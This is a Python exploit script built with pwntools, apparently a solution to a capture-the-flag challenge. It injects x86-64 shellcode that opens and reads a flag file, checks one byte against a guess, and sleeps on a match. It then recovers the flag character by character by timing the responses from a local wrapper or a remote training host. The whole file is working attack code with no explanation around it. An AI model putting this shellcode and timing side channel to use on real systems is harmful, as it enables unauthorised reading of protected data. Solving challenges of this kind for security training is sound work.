from pwn import *
import time

context.arch = 'amd64'

def create_timing_shellcode(position, char):
    shellcode = asm(f'''
        /* Open /challenge/flag */
        mov rax, 0x00000067616c662f
        push rax
        mov rax, 0x656c6c656e616863
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        
        /* Read flag into stack */
        mov rdi, rax
        sub rsp, 0x100
        mov rsi, rsp
        mov rdx, 0x100
        xor rax, rax
        syscall
        
        /* Check character at position {position} */
        cmp byte ptr [rsi + {position}], {char}
        jne skip
        
        /* If match, nanosleep for 0.1 seconds */
        mov rdi, 0
        mov rsi, rsp
        mov qword ptr [rsi], 0      /* tv_sec = 0 */
        mov qword ptr [rsi+8], 100000000  /* tv_nsec = 100,000,000 = 0.1s */
        mov rax, 35                 /* nanosleep syscall */
        syscall
        
    skip:
        xor rdi, rdi
        mov rax, 60
        syscall
    ''')
    
    return shellcode.ljust(1024, b'\x90')

def brute_force_flag():
    flag = ""
    position = 0
    baseline = 0.016  # Your measured baseline
    
    while len(flag) < 50:  # Reasonable flag length limit
        print(f"Trying position {position}, current flag: {flag}")
        found_char = False
        
        # Try printable characters
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!"
        
        for char in charset:
            if args.REMOTE:
                p = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
            else:
                # For local testing
                p = process(["python3", "wrapper.py"])
            
            try:
                # Wait for prompt
                p.recvuntil(b"Shellcode: ", timeout=5)
                
                # Send shellcode
                shellcode = create_timing_shellcode(position, ord(char))
                p.send(shellcode)
                
                # Get timing
                response = p.recvuntil(b"Time: ", timeout=10)
                timing_line = p.recvline(timeout=5).decode().strip()
                time_taken = float(timing_line)
                
                p.close()
                
                # Check if significantly longer than baseline
                if time_taken > baseline + 0.05:  # 0.05s threshold
                    flag += char
                    print(f"FOUND: position {position} = '{char}' -> {flag}")
                    found_char = True
                    position += 1
                    break
                else:
                    print(f"  {char}: {time_taken:.3f}s")
                    
            except Exception as e:
                print(f"Error with char '{char}': {e}")
                try:
                    p.close()
                except:
                    pass
                continue
        
        if not found_char:
            # Maybe we hit the end of the flag or need to adjust threshold
            print(f"No character found for position {position}")
            print(f"Final flag: {flag}")
            break
            
        # Check if flag is complete
        if flag.endswith('}'):
            print(f"Complete flag found: {flag}")
            break
    
    return flag

if __name__ == "__main__":
    flag = brute_force_flag()
    print(f"FLAG: {flag}")